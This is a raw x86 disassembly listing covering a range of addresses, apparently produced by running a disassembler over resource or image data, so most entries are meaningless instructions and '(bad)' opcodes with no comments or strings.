110115f3:	add    BYTE PTR [edx],al
110115f5:	add    al,0x47
110115f7:	imul   ebp,DWORD PTR [ecx+0x62],0x5c60605a
110115fe:	push   ebp
110115ff:	push   eax
11011600:	dec    ecx
11011601:	inc    edx
11011602:	cmp    dh,BYTE PTR ds:[eax+esi*1]
11011606:	push   esp
11011607:	imul   esp,DWORD PTR [edi+0x47],0x204
1101160e:	add    BYTE PTR [eax],al
11011610:	add    BYTE PTR [eax],al
11011612:	add    BYTE PTR [eax],al
11011614:	pop    es
11011615:	push   cs
11011616:	or     al,0x47
11011618:	outs   dx,DWORD PTR ds:[esi]
11011619:	push   0x595c5a5e
1101161e:	push   ebx
1101161f:	dec    edi
11011620:	inc    ebp
11011621:	inc    ecx
11011622:	cmp    dh,BYTE PTR ds:[edx+ecx*2]
11011626:	outs   dx,WORD PTR ds:[esi]
11011628:	inc    edi
11011629:	or     al,0xe
1101162b:	pop    es
	...
11011634:	or     BYTE PTR ds:0x6947090f,bl
1101163a:	push   0x4e515662
1101163f:	dec    ecx
11011640:	inc    ebx
11011641:	aas    
11011642:	cmp    al,0x40
11011644:	push   edi
11011645:	addr16 inc di
11011648:	or     DWORD PTR [edi],ecx
1101164a:	sbb    eax,0x8
1101164f:	add    BYTE PTR [eax],al
11011651:	add    BYTE PTR [eax],al
11011653:	add    BYTE PTR [eax],cl
11011655:	sbb    eax,0x470c0f2d
1101165a:	outs   dx,DWORD PTR ds:[esi]
1101165b:	imul   esp,DWORD PTR [esp+ebx*2+0x50],0x55494244
11011663:	arpl   WORD PTR [ecx+0x6f],bp
11011666:	inc    edi
11011667:	or     al,0xf
11011669:	xor    BYTE PTR ds:0x8,bl
1101166f:	add    BYTE PTR [eax],al
11011671:	add    BYTE PTR [eax],al
11011673:	add    BYTE PTR [eax],cl
11011675:	sbb    eax,0x90f3130
1101167a:	inc    edi
1101167b:	outs   dx,DWORD PTR ds:[si]
1101167d:	outs   dx,DWORD PTR ds:[esi]
1101167e:	outs   dx,DWORD PTR ds:[esi]
1101167f:	outs   dx,DWORD PTR ds:[esi]
11011680:	outs   dx,DWORD PTR ds:[esi]
11011681:	outs   dx,DWORD PTR ds:[esi]
11011682:	outs   dx,DWORD PTR ds:[esi]
11011683:	outs   dx,DWORD PTR ds:[esi]
11011684:	imul   eax,DWORD PTR [edi+0x9],0x1d31310f
1101168b:	or     BYTE PTR [eax],al
1101168d:	add    BYTE PTR [eax],al
1101168f:	add    BYTE PTR [eax],al
11011691:	add    BYTE PTR [eax],al
11011693:	add    BYTE PTR [eax],cl
11011695:	sbb    eax,0xf303131
1101169a:	or     al,0x47
1101169c:	outs   dx,DWORD PTR ds:[esi]
1101169d:	outs   dx,DWORD PTR ds:[esi]
1101169e:	outs   dx,DWORD PTR ds:[esi]
1101169f:	outs   dx,DWORD PTR ds:[esi]
110116a0:	outs   dx,DWORD PTR ds:[esi]
110116a1:	outs   dx,DWORD PTR ds:[esi]
110116a2:	outs   dx,DWORD PTR ds:[esi]
110116a3:	outs   dx,DWORD PTR ds:[esi]
110116a4:	inc    edi
110116a5:	or     al,0xf
110116a7:	sub    eax,0x81d3031
	...
110116b4:	push   es
110116b5:	nop    DWORD PTR ds:0x40e1d1d
110116bc:	inc    edi
110116bd:	outs   dx,DWORD PTR ds:[si]
110116bf:	outs   dx,DWORD PTR ds:[esi]
110116c0:	outs   dx,DWORD PTR ds:[esi]
110116c1:	outs   dx,DWORD PTR ds:[esi]
110116c2:	addr16 inc edi
110116c4:	add    al,0xe
110116c6:	sbb    eax,0xf1d1d1d
110116cb:	push   es
	...
110116d4:	add    DWORD PTR [esi],eax
110116d6:	or     BYTE PTR [eax],cl
110116d8:	or     BYTE PTR [eax],cl
110116da:	pop    es
110116db:	add    cl,BYTE PTR [edx]
110116dd:	inc    edi
110116de:	outs   dx,DWORD PTR ds:[esi]
110116df:	outs   dx,DWORD PTR ds:[esi]
110116e0:	outs   dx,DWORD PTR ds:[esi]
110116e1:	outs   dx,DWORD PTR ds:[esi]
110116e2:	inc    edi
110116e3:	or     al,BYTE PTR [edx]
110116e5:	pop    es
110116e6:	or     BYTE PTR [eax],cl
110116e8:	or     BYTE PTR [eax],cl
110116ea:	push   es
110116eb:	add    DWORD PTR [eax],eax
	...
110116fd:	add    eax,DWORD PTR [edi+0x67]
11011700:	addr16 inc edi
11011702:	add    eax,DWORD PTR [eax]
	...
1101171c:	add    BYTE PTR [eax],al
1101171e:	or     eax,0xd4747
	...
1101173f:	add    eax,DWORD PTR [ebx]
	...
1101176d:	add    BYTE PTR [eax],al
1101176f:	add    bh,bh
11011771:	(bad)  
11011772:	(bad)  
11011773:	(bad)  
11011774:	(bad)  
11011775:	(bad)  
11011776:	jg     0x11011777
11011778:	(bad)  
11011779:	cld    
1101177a:	aas    
1101177b:	(bad)  
1101177c:	(bad)  
1101177d:	clc    
1101177e:	pop    ds
1101177f:	push   eax
11011781:	add    BYTE PTR [eax],al
11011783:	(bad)  
11011785:	add    BYTE PTR [eax],al
11011787:	(bad)  
11011789:	add    BYTE PTR [eax],al
1101178b:	(bad)  
1101178d:	add    BYTE PTR [eax],al
1101178f:	(bad)  
11011791:	add    BYTE PTR [eax],al
11011793:	(bad)  
11011795:	add    BYTE PTR [eax],al
11011797:	(bad)  
11011799:	add    BYTE PTR [eax],al
1101179b:	(bad)  
1101179d:	add    BYTE PTR [eax],al
1101179f:	(bad)  
110117a1:	add    BYTE PTR [eax],al
110117a3:	pavgb  mm0,QWORD PTR [eax]
110117a6:	add    BYTE PTR [edi],al
110117a8:	rol    BYTE PTR [eax],0x0
110117ab:	add    eax,DWORD PTR [eax-0x7fff0000]
110117b1:	add    BYTE PTR [eax],al
110117b3:	add    eax,eax
110117b5:	add    BYTE PTR [eax],al
110117b7:	add    esp,eax
110117b9:	add    BYTE PTR [eax],al
110117bb:	pop    es
110117bc:	lock add BYTE PTR [eax],al
110117bf:	(bad)  
110117c1:	add    BYTE PTR [eax],al
110117c3:	(bad)  
110117c5:	add    BYTE PTR [eax],al
110117c7:	(bad)  
110117c9:	add    BYTE PTR [eax],al
110117cb:	(bad)  
110117cd:	add    BYTE PTR [eax],al
110117cf:	(bad)  
110117d1:	add    BYTE PTR [eax],al
110117d3:	(bad)  
110117d5:	add    BYTE PTR [eax],al
110117d7:	(bad)  
110117d9:	add    BYTE PTR [eax],al
110117db:	(bad)  
110117dd:	add    BYTE PTR [eax],al
110117df:	ud0    edi,eax
110117e2:	pop    ds
110117e3:	(bad)  
110117e4:	(bad)  
110117e5:	cld    
110117e6:	aas    
110117e7:	(bad)  
110117e8:	(bad)  
110117e9:	(bad)  
110117ea:	jg     0x110117eb
110117ec:	(bad)  
110117ed:	(bad)  
110117ee:	(bad)  
110117ef:	jmp    FWORD PTR [eax]
110117f1:	add    BYTE PTR [eax],al
110117f3:	add    BYTE PTR [eax],bl
110117f5:	add    BYTE PTR [eax],al
110117f7:	add    BYTE PTR [eax],dh
110117f9:	add    BYTE PTR [eax],al
110117fb:	add    BYTE PTR [ecx],al
110117fd:	add    BYTE PTR [eax],cl
	...
1101181b:	add    BYTE PTR [edi],cl
1101181d:	or     BYTE PTR ds:0x70b1300,al
11011823:	add    BYTE PTR [edx+eiz*1],bh
11011826:	push   ss
11011827:	add    BYTE PTR [ebp+0x45],al
1101182a:	inc    ebp
1101182b:	add    BYTE PTR [edx+0x48],cl
1101182e:	inc    edi
1101182f:	add    BYTE PTR [ecx+0x48],cl
11011832:	dec    eax
11011833:	add    BYTE PTR [ebp-0x32ffc2a3],ah
11011839:	pop    ecx
1101183a:	xor    eax,DWORD PTR [eax]
1101183c:	shl    DWORD PTR [eax+0x39],cl
1101183f:	add    al,bl
11011841:	addr16 aas 
11011843:	add    ch,dl
11011845:	addr16 inc ecx
11011847:	add    cl,bl
11011849:	push   0x6eda0040
1101184e:	inc    edi
1101184f:	add    dh,bl
11011851:	outs   dx,DWORD PTR ds:[esi]
11011852:	inc    ebp
11011853:	add    dh,bl
11011855:	jo     0x1101189d
11011857:	add    bl,dl
11011859:	jb     0x110118af
1101185b:	add    cl,bl
1101185d:	jge    0x110118be
1101185f:	add    bl,ah
11011861:	jbe    0x110118ae
11011863:	add    ah,ah
11011865:	js     0x110118b5
11011867:	add    al,ch
11011869:	jle    0x110118bc
1101186b:	add    cl,ch
1101186d:	adc    DWORD PTR [esi+0x0],0x5882e9
11011874:	out    dx,al
11011875:	xchg   BYTE PTR [ecx+0x0],bl
11011878:	out    dx,al
11011879:	mov    DWORD PTR [ebp+0x0],ebx
1101187c:	xrelease mov DWORD PTR [edx+0x0],ebx
11011880:	hlt    
11011881:	mov    DWORD PTR [ebx+0x0],ebx
11011884:	repnz mov ebx,DWORD PTR [ebp+0x0]
11011888:	repnz mov WORD PTR [ebp+0x0],ds
1101188c:	out    dx,al
1101188d:	mov    WORD PTR [ecx+0x0],fs
11011890:	in     eax,0x8d
11011892:	ins    BYTE PTR es:[edi],dx
11011893:	add    ah,dh
11011895:	(bad)  
11011896:	popa   
11011897:	add    bl,dh
11011899:	nop
1101189a:	fs add ah,dh
1101189d:	xchg   ecx,eax
1101189e:	fs add bl,dh
110118a1:	xchg   esp,eax
110118a2:	push   0x0
110118a4:	cmc    
110118a5:	xchg   ebp,eax
110118a6:	push   0x0
110118a8:	hlt    
110118a9:	cwde   
110118aa:	outs   dx,BYTE PTR ds:[esi]
110118ab:	add    dh,dh
110118ad:	pushf  
110118ae:	jae    0x110118b0
110118b0:	icebp  
110118b1:	call   0x78:0x9ff50074
110118b8:	mul    BYTE PTR [ecx-0x5c09ff85]
110118be:	jge    0x110118c0
110118c0:	mul    BYTE PTR [esi+edi*2-0x7a570900]
110118c7:	add    bh,dh
110118c9:	lods   al,BYTE PTR ds:[esi]
110118ca:	mov    eax,DWORD PTR [eax]
110118cc:	imul   DWORD PTR [esi-0x4b07ff73]
110118d2:	xchg   ebp,eax
110118d3:	add    al,ch
110118d5:	mov    ch,0xa5
110118d7:	add    al,bh
110118d9:	mov    esp,0xc4f300a1
110118de:	mov    cl,0x0
110118e0:	stc    
110118e1:	(bad)  
110118e2:	mov    al,0x0
110118e4:	stc    
110118e5:	leave  
110118e6:	mov    bl,0x0
110118e8:	cli    
110118e9:	into   
110118ea:	mov    edx,0xbccffa00
110118ef:	add    bl,bh
110118f1:	(bad)  
110118f2:	mov    BYTE PTR [eax],0xfb
110118f5:	fmul   st,st(1)
110118f7:	add    ah,bh
110118f9:	(bad)  
110118fb:	add    cl,bh
110118fd:	in     al,dx
110118fe:	call   0xfef41703
11011903:	add    ch,dh
11011905:	cmc    
11011906:	cmc    
11011907:	add    dh,bh
11011909:	clc    
1101190a:	cmc    
1101190b:	add    ch,bh
1101190d:	cli    
1101190e:	stc    
1101190f:	add    dh,bh
11011911:	(bad)  
11011912:	inc    BYTE PTR [eax]
11011914:	(bad)  
11011915:	(bad)  
11011916:	inc    DWORD PTR [eax]
11011918:	add    BYTE PTR [eax],al
1101191a:	add    BYTE PTR [eax],al
1101191c:	add    BYTE PTR [edi],ch
1101191e:	push   cs
1101191f:	add    BYTE PTR [eax],al
11011921:	push   eax
11011922:	sbb    BYTE PTR [eax],al
11011924:	add    BYTE PTR [eax+0x22],dh
11011927:	add    BYTE PTR [eax],al
11011929:	nop
1101192a:	sub    al,0x0
1101192c:	add    BYTE PTR [eax-0x30ffffca],dh
11011932:	inc    eax
11011933:	add    BYTE PTR [eax],al
11011935:	lock dec edx
11011937:	add    BYTE PTR [ecx],dl
11011939:	call   FWORD PTR [ebx+0x0]
1101193c:	xor    edi,edi
1101193e:	jno    0x11011940
11011940:	push   ecx
11011941:	inc    DWORD PTR [edi-0x62008f00]
11011947:	add    BYTE PTR [ecx-0x4eff4d01],dl
1101194d:	dec    ecx
1101194f:	add    cl,dl
11011951:	(bad)  
11011952:	fild   WORD PTR [eax]
11011954:	(bad)  
11011955:	(bad)  
11011956:	inc    DWORD PTR [eax]
11011958:	add    BYTE PTR [eax],al
1101195a:	add    BYTE PTR [eax],al
1101195c:	add    ch,BYTE PTR [edi]
1101195e:	add    BYTE PTR [eax],al
11011960:	add    al,0x50
11011962:	add    BYTE PTR [eax],al
11011964:	push   es
11011965:	jo     0x11011967
11011967:	add    BYTE PTR [eax],cl
11011969:	nop
1101196a:	add    BYTE PTR [eax],al
1101196c:	or     dh,BYTE PTR [eax-0x30f50000]
11011972:	add    BYTE PTR [eax],al
11011974:	push   cs
11011975:	lock add BYTE PTR [eax],al
11011978:	and    bh,bh
1101197a:	adc    al,BYTE PTR [eax]
1101197c:	cmp    eax,0x5b0031ff
11011981:	call   DWORD PTR [ecx+0x0]
11011984:	jns    0x11011985
11011986:	jno    0x11011988
11011988:	cwde   
11011989:	call   DWORD PTR [ecx-0x4e004b00]
1101198f:	add    ah,dl
11011991:	call   ecx
11011993:	add    bh,bh
11011995:	(bad)  
11011996:	inc    DWORD PTR [eax]
11011998:	add    BYTE PTR [eax],al
1101199a:	add    BYTE PTR [eax],al
1101199c:	adc    al,0x2f
1101199e:	add    BYTE PTR [eax],al
110119a0:	and    dl,BYTE PTR [eax+0x0]
110119a3:	add    BYTE PTR [eax],dh
110119a5:	jo     0x110119a7
110119a7:	add    BYTE PTR ds:0x4c000090,bh
110119ad:	mov    al,0x0
110119af:	add    BYTE PTR [ecx-0x31],bl
110119b2:	add    BYTE PTR [eax],al
110119b4:	lock add BYTE PTR [bx+si],al
110119b8:	js     0x110119b9
110119ba:	adc    DWORD PTR [eax],eax
110119bc:	mov    bh,bh
110119be:	xor    DWORD PTR [eax],eax
110119c0:	pushf  
110119c1:	call   DWORD PTR [ecx+0x0]
110119c4:	scas   al,BYTE PTR es:[edi]
110119c5:	push   DWORD PTR [ecx+0x0]
110119c8:	sar    bh,0x91
110119cb:	add    dl,dl
110119cd:	push   DWORD PTR [ecx-0x2e001c00]
110119d3:	add    bh,bh
110119d5:	(bad)  
110119d6:	inc    DWORD PTR [eax]
110119d8:	add    BYTE PTR [eax],al
110119da:	add    BYTE PTR [eax],al
110119dc:	es das 
110119de:	add    BYTE PTR [eax],al
110119e0:	inc    eax
110119e1:	push   eax
110119e2:	add    BYTE PTR [eax],al
110119e4:	pop    edx
110119e5:	jo     0x110119e7
110119e7:	add    BYTE PTR [eax+edx*4+0x0],dh
110119eb:	add    BYTE PTR [esi-0x56ffff50],cl
110119f1:	iret   
110119f2:	add    BYTE PTR [eax],al
110119f4:	ret    0xf0
110119f7:	add    cl,dl
110119f9:	call   DWORD PTR [ecx]
110119fb:	add    al,bl
110119fd:	push   DWORD PTR [ecx]
110119ff:	add    dh,bl
11011a01:	call   DWORD PTR [ecx+0x0]
11011a04:	jecxz  0x11011a05
11011a06:	jno    0x11011a08
11011a08:	jmp    0x1ac0c
11011a0d:	push   DWORD PTR [ecx-0x2e000a00]
11011a13:	add    bh,bh
11011a15:	(bad)  
11011a16:	inc    DWORD PTR [eax]
11011a18:	add    BYTE PTR [eax],al
11011a1a:	add    BYTE PTR [eax],al
11011a1c:	das    
11011a1d:	add    BYTE PTR es:[eax],al
11011a20:	push   eax
11011a21:	inc    ecx
11011a22:	add    BYTE PTR [eax],al
11011a24:	jo     0x11011a81
11011a26:	add    BYTE PTR [eax],al
11011a28:	nop
11011a29:	je     0x11011a2b
11011a2b:	add    BYTE PTR [eax-0x30ffff72],dh
11011a31:	test   eax,0xc3f00000
11011a36:	add    BYTE PTR [eax],al
11011a38:	call   edx
11011a3a:	adc    DWORD PTR [eax],eax
11011a3c:	(bad)  
11011a3d:	fdiv   DWORD PTR [ecx]
11011a3f:	add    bh,bh
11011a41:	fst    QWORD PTR [ecx+0x0]
11011a44:	jmp    esp
11011a46:	jno    0x11011a48
11011a48:	(bad)  
11011a49:	jmp    0xb1:0xf0ff0091
11011a50:	push   esi
11011a52:	rol    DWORD PTR [eax],1
11011a54:	(bad)  
11011a55:	(bad)  
11011a56:	inc    DWORD PTR [eax]
11011a58:	add    BYTE PTR [eax],al
11011a5a:	add    BYTE PTR [eax],al
11011a5c:	das    
11011a5d:	adc    al,0x0
11011a5f:	add    BYTE PTR [eax+0x22],dl
11011a62:	add    BYTE PTR [eax],al
11011a64:	jo     0x11011a96
11011a66:	add    BYTE PTR [eax],al
11011a68:	nop
11011a69:	add    BYTE PTR ds:[eax],al
11011a6c:	mov    al,0x4d
11011a6e:	add    BYTE PTR [eax],al
11011a70:	iret   
11011a71:	pop    ebx
11011a72:	add    BYTE PTR [eax],al
11011a74:	lock imul eax,DWORD PTR [eax],0x1179ff00
11011a7b:	add    bh,bh
11011a7d:	mov    dh,BYTE PTR [ecx]
11011a7f:	add    bh,bh
11011a81:	popf   
11011a82:	push   ecx
11011a83:	add    bh,bh
11011a85:	scas   eax,DWORD PTR es:[edi]
11011a86:	jno    0x11011a88
11011a88:	inc    ecx
11011a8a:	xchg   ecx,eax
11011a8b:	add    bh,bh
11011a8d:	shl    BYTE PTR [ecx-0x2e1a0100],cl
11011a93:	add    bh,bh
11011a95:	(bad)  
11011a96:	inc    DWORD PTR [eax]
11011a98:	add    BYTE PTR [eax],al
11011a9a:	add    BYTE PTR [eax],al
11011a9c:	das    
11011a9d:	add    eax,DWORD PTR [eax]
11011a9f:	add    BYTE PTR [eax+0x4],dl
11011aa2:	add    BYTE PTR [eax],al
11011aa4:	jo     0x11011aac
11011aa6:	add    BYTE PTR [eax],al
11011aa8:	nop
11011aa9:	or     DWORD PTR [eax],eax
11011aab:	add    BYTE PTR [eax-0x30fffff6],dh
11011ab1:	or     al,0x0
11011ab3:	add    al,dh
11011ab5:	push   cs
11011ab6:	add    BYTE PTR [eax],al
11011ab8:	jmp    DWORD PTR [eax]
11011aba:	adc    al,BYTE PTR [eax]
11011abc:	(bad)  
11011abd:	xor    DWORD PTR ds:[eax],eax
11011ac0:	call   FWORD PTR [ecx+edx*2+0x0]
11011ac4:	(bad)  
11011ac5:	jp     0x11011b38
11011ac7:	add    bh,bh
11011ac9:	xchg   edi,eax
11011aca:	xchg   ecx,eax
11011acb:	add    bh,bh
11011acd:	mov    dh,0xb1
11011acf:	add    bh,bh
11011ad1:	aam    0xd1
11011ad3:	add    bh,bh
11011ad5:	(bad)  
11011ad6:	inc    DWORD PTR [eax]
11011ad8:	add    BYTE PTR [eax],al
11011ada:	add    BYTE PTR [eax],al
11011adc:	das    
11011add:	add    BYTE PTR [esi],cl
11011adf:	add    BYTE PTR [eax+0x0],dl
11011ae2:	pop    ss
11011ae3:	add    BYTE PTR [eax+0x0],dh
11011ae6:	and    DWORD PTR [eax],eax
11011ae8:	nop
11011ae9:	add    BYTE PTR [ebx],ch
11011aeb:	add    BYTE PTR [eax-0x30ffca00],dh
11011af1:	add    BYTE PTR [eax+0x0],al
11011af4:	lock add BYTE PTR [ecx+0x0],cl
11011af8:	call   DWORD PTR [ecx]
11011afa:	pop    edx
11011afb:	add    bh,bh
11011afd:	xor    DWORD PTR [eax+0x0],esi
11011b00:	call   DWORD PTR [ecx-0x7a]
11011b03:	add    bh,bh
11011b05:	jno    0x11011aa3
11011b07:	add    bh,bh
11011b09:	xchg   ecx,eax
11011b0a:	mov    dl,0x0
11011b0c:	push   DWORD PTR [ecx-0x2e00ff38]
11011b12:	fild   WORD PTR [eax]
11011b14:	(bad)  
11011b15:	(bad)  
11011b16:	inc    DWORD PTR [eax]
11011b18:	add    BYTE PTR [eax],al
11011b1a:	add    BYTE PTR [eax],al
11011b1c:	das    
11011b1d:	add    BYTE PTR [eax],ah
11011b1f:	add    BYTE PTR [eax+0x0],dl
11011b22:	add    BYTE PTR ss:[eax+0x0],dh
11011b26:	dec    esp
11011b27:	add    BYTE PTR [eax-0x4fff9e00],dl
11011b2d:	add    BYTE PTR [eax+0x0],bh
11011b30:	iret   
11011b31:	add    BYTE PTR [esi-0x5bff1000],cl
11011b37:	add    bh,bh
11011b39:	adc    DWORD PTR [ebx-0x41ce0100],esi
11011b3f:	add    bh,bh
11011b41:	push   ecx
11011b42:	mov    DWORD PTR [eax],0xd171ff
11011b48:	call   DWORD PTR [ecx-0x4e00ff24]
11011b4e:	in     eax,0x0
11011b50:	call   ecx
11011b52:	lock add bh,bh
11011b55:	(bad)  
11011b56:	inc    DWORD PTR [eax]
11011b58:	add    BYTE PTR [eax],al
11011b5a:	add    BYTE PTR [eax],al
11011b5c:	sub    al,0x0
11011b5e:	das    
11011b5f:	add    BYTE PTR [ebx+0x0],cl
11011b62:	push   eax
11011b63:	add    BYTE PTR [ecx+0x0],ch
11011b66:	jo     0x11011b68
11011b68:	xchg   DWORD PTR [eax],eax
11011b6a:	nop
11011b6b:	add    BYTE PTR [ebp-0x3bff5000],ah
11011b71:	add    bh,cl
11011b73:	add    cl,ah
11011b75:	add    al,dh
11011b77:	add    al,dh
11011b79:	adc    edi,edi
11011b7b:	add    dl,dh
11011b7d:	xor    edi,edi
11011b7f:	add    ah,dh
11011b81:	push   ecx
11011b82:	inc    DWORD PTR [eax]
11011b84:	div    BYTE PTR [ecx-0x1]
11011b87:	add    bh,dh
11011b89:	xchg   ecx,eax
11011b8a:	inc    DWORD PTR [eax]
11011b8c:	stc    
11011b8d:	mov    cl,0xff
11011b8f:	add    bl,bh
11011b91:	sar    edi,1
11011b93:	add    bh,bh
11011b95:	(bad)  
11011b96:	inc    DWORD PTR [eax]
11011b98:	add    BYTE PTR [eax],al
11011b9a:	add    BYTE PTR [eax],al
11011b9c:	sbb    eax,DWORD PTR [eax]
11011b9e:	das    
11011b9f:	add    BYTE PTR ds:0x3f005000,ch
11011ba5:	add    BYTE PTR [eax+0x0],dh
11011ba8:	push   edx
11011ba9:	add    BYTE PTR [eax-0x4fff9d00],dl
11011baf:	add    BYTE PTR [esi+0x0],dh
11011bb2:	iret   
11011bb3:	add    BYTE PTR [eax-0x66ff1000],cl
11011bb9:	adc    edi,edi
11011bbb:	add    BYTE PTR [esi-0x4bff00cf],ah
11011bc1:	push   ecx
11011bc2:	inc    DWORD PTR [eax]
11011bc4:	ret    0xff71
11011bc7:	add    bh,cl
11011bc9:	xchg   ecx,eax
11011bca:	inc    DWORD PTR [eax]
11011bcc:	fdiv   QWORD PTR [ecx-0x2e14ff01]
11011bd2:	inc    DWORD PTR [eax]
11011bd4:	(bad)  
11011bd5:	(bad)  
11011bd6:	inc    DWORD PTR [eax]
11011bd8:	add    BYTE PTR [eax],al
11011bda:	add    BYTE PTR [eax],al
11011bdc:	or     BYTE PTR [eax],al
11011bde:	das    
11011bdf:	add    BYTE PTR [esi],cl
11011be1:	add    BYTE PTR [eax+0x0],dl
11011be4:	adc    eax,0x1b007000
11011be9:	add    BYTE PTR [eax-0x4fffdf00],dl
11011bef:	add    BYTE PTR [esi],ah
11011bf1:	add    bh,cl
11011bf3:	add    BYTE PTR [eax+eax*1],ch
11011bf6:	lock add BYTE PTR [esi],bh
11011bf9:	adc    edi,edi
11011bfb:	add    BYTE PTR [eax+0x31],bl
11011bfe:	inc    DWORD PTR [eax]
11011c00:	jno    0x11011c53
11011c02:	inc    DWORD PTR [eax]
11011c04:	mov    WORD PTR [ecx-0x1],?
11011c07:	add    BYTE PTR [esi-0x40ff006f],ah
11011c0d:	mov    cl,0xff
11011c0f:	add    dl,bl
11011c11:	sar    edi,1
11011c13:	add    bh,bh
11011c15:	(bad)  
11011c16:	inc    DWORD PTR [eax]
	...
11011c38:	add    BYTE PTR [eax],al
11011c3a:	add    BYTE PTR [esi],al
11011c3c:	push   es
	...
11011c51:	add    BYTE PTR [esi],al
11011c53:	cmp    edi,DWORD PTR [ebx]
11011c55:	push   es
	...
11011c62:	add    BYTE PTR [edx],al
11011c64:	add    eax,DWORD PTR [ebx]
11011c66:	add    eax,DWORD PTR [ebx]
11011c68:	add    al,BYTE PTR [ebx+edi*1]
11011c6b:	aas    
11011c6c:	aas    
11011c6d:	cmp    eax,DWORD PTR [edx+eax*1]
11011c70:	add    eax,DWORD PTR [ebx]
11011c72:	add    eax,DWORD PTR [ebx]
11011c74:	add    al,BYTE PTR [eax]
11011c76:	add    BYTE PTR [eax],al
11011c78:	add    BYTE PTR [eax],al
11011c7a:	add    BYTE PTR [ebx],al
11011c7c:	sbb    bl,BYTE PTR [edx]
11011c7e:	sbb    al,BYTE PTR [edi]
11011c80:	add    eax,0x3f3f3f3b
11011c85:	aas    
11011c86:	cmp    eax,DWORD PTR ds:0x1c1a1a07
11011c8c:	add    eax,DWORD PTR [eax]
11011c8e:	add    BYTE PTR [eax],al
11011c90:	add    BYTE PTR [eax],al
11011c92:	add    BYTE PTR [ebx],al
11011c94:	sbb    bl,BYTE PTR [edx]
11011c96:	pop    es
11011c97:	add    eax,0x3e3f3f3b
11011c9c:	aas    
11011c9d:	aas    
11011c9e:	aas    
11011c9f:	cmp    eax,DWORD PTR ds:0x31a1f07
11011ca5:	add    BYTE PTR [eax],al
11011ca7:	add    BYTE PTR [eax],al
11011ca9:	add    BYTE PTR [eax],al
11011cab:	add    ebx,DWORD PTR [edx]
11011cad:	pop    es
11011cae:	push   es
11011caf:	cmp    edi,DWORD PTR ds:0xb0d1e31
11011cb5:	adc    DWORD PTR [edi],ebp
11011cb7:	cmp    eax,0x1a07053b
11011cbc:	add    eax,DWORD PTR [eax]
11011cbe:	add    BYTE PTR [eax],al
11011cc0:	add    BYTE PTR [eax],al
11011cc2:	add    BYTE PTR [ebx],al
11011cc4:	pop    es
11011cc5:	add    eax,0x14263a3d
11011cca:	adc    cl,BYTE PTR [esi]
11011ccc:	or     al,0x9
11011cce:	or     BYTE PTR [eax],dl
11011cd0:	cmp    DWORD PTR [ebx],edi
11011cd2:	add    eax,0x307
11011cd7:	add    BYTE PTR [eax],al
11011cd9:	add    BYTE PTR [eax],al
11011cdb:	add    al,BYTE PTR ds:0x1c293d3b
11011ce1:	pop    ss
11011ce2:	adc    eax,0x90c0f13
11011ce7:	or     BYTE PTR [eax],dl
11011ce9:	cmp    eax,0x2053b
11011cee:	add    BYTE PTR [eax],al
11011cf0:	add    BYTE PTR [eax],al
11011cf2:	add    BYTE PTR [ebx+edi*1],al
11011cf5:	aas    
11011cf6:	xor    al,0x1f
11011cf8:	and    DWORD PTR [ecx],esp
11011cfa:	sbb    BYTE PTR [esi],dl
11011cfc:	adc    ecx,DWORD PTR [edi]
11011cfe:	or     al,0x9
11011d00:	or     BYTE PTR [edi],ch
11011d02:	aas    
11011d03:	cmp    eax,DWORD PTR [eax+eax*1]
11011d06:	add    BYTE PTR [eax],al
11011d08:	add    BYTE PTR [eax],al
11011d0a:	push   es
11011d0b:	cmp    edi,DWORD PTR [edi]
11011d0d:	aas    
11011d0e:	sub    esp,DWORD PTR [ebx]
11011d10:	and    al,0x24
11011d12:	and    ebx,DWORD PTR ds:0xc0f1316
11011d18:	or     DWORD PTR [ecx],edx
11011d1a:	aas    
11011d1b:	aas    
11011d1c:	cmp    eax,DWORD PTR [esi]
11011d1e:	add    BYTE PTR [eax],al
11011d20:	add    BYTE PTR [esi],al
11011d22:	cmp    edi,DWORD PTR [edi]
11011d24:	aas    
11011d25:	ds and eax,0x272a2a27
11011d2b:	and    al,0x1d
11011d2d:	push   ss
11011d2e:	adc    ecx,DWORD PTR [edi]
11011d30:	or     al,0xb
11011d32:	aas    
11011d33:	aas    
11011d34:	aas    
11011d35:	cmp    eax,DWORD PTR [esi]
11011d37:	add    BYTE PTR [eax],al
11011d39:	push   es
11011d3a:	cmp    edi,DWORD PTR [esi]
11011d3c:	aas    
11011d3d:	aas    
11011d3e:	sub    ch,BYTE PTR ds:0x292c2e2e
11011d44:	and    al,0x1d
11011d46:	adc    eax,0x3f0d0f13
11011d4b:	aas    
11011d4c:	aas    
11011d4d:	cmp    eax,DWORD PTR [esi]
11011d4f:	add    BYTE PTR [eax],al
11011d51:	add    BYTE PTR [esi],al
11011d53:	cmp    edi,DWORD PTR [edi]
11011d55:	xor    BYTE PTR ds:[eax],dh
11011d58:	xor    esi,DWORD PTR [edx]
11011d5a:	xor    BYTE PTR [eax+ebp*1],ch
11011d5d:	and    ebx,DWORD PTR [eax]
11011d5f:	adc    eax,0x3f3f1e12
11011d64:	cmp    eax,DWORD PTR [esi]
11011d66:	add    BYTE PTR [eax],al
11011d68:	add    BYTE PTR [eax],al
11011d6a:	add    BYTE PTR [esi],al
11011d6c:	cmp    edi,DWORD PTR [edi]
11011d6e:	cmp    BYTE PTR [edx],dh
11011d70:	aaa    
11011d71:	xor    ebp,DWORD PTR ss:[esi]
11011d74:	sub    ah,BYTE PTR [ecx+eiz*1]
11011d77:	pop    ss
11011d78:	adc    al,0x31
11011d7a:	aas    
11011d7b:	cmp    eax,DWORD PTR [eax+eax*1]
11011d7e:	add    BYTE PTR [eax],al
11011d80:	add    BYTE PTR [eax],al
11011d82:	add    BYTE PTR [edx],al
11011d84:	add    eax,0x37353e3b
11011d89:	aaa    
11011d8a:	xor    ebp,DWORD PTR [esi]
11011d8c:	sub    ah,BYTE PTR [ecx+eiz*1]
11011d8f:	sbb    al,0x26
11011d91:	cmp    eax,0x2053b
11011d96:	add    BYTE PTR [eax],al
11011d98:	add    BYTE PTR [eax],al
11011d9a:	add    BYTE PTR [ebx],al
11011d9c:	pop    es
11011d9d:	add    eax,0x33353c3b
11011da2:	xor    BYTE PTR ds:0x291f2327,ch
11011da8:	cmp    bh,BYTE PTR [ebx]
11011daa:	add    eax,0x307
11011daf:	add    BYTE PTR [eax],al
11011db1:	add    BYTE PTR [eax],al
11011db3:	add    ebx,DWORD PTR [edx]
11011db5:	pop    es
11011db6:	add    eax,0x30383e3b
11011dbb:	sub    ah,BYTE PTR ds:0x3b3e352b
11011dc1:	add    eax,0x31a07
11011dc6:	add    BYTE PTR [eax],al
11011dc8:	add    BYTE PTR [eax],al
11011dca:	add    BYTE PTR [ebx],al
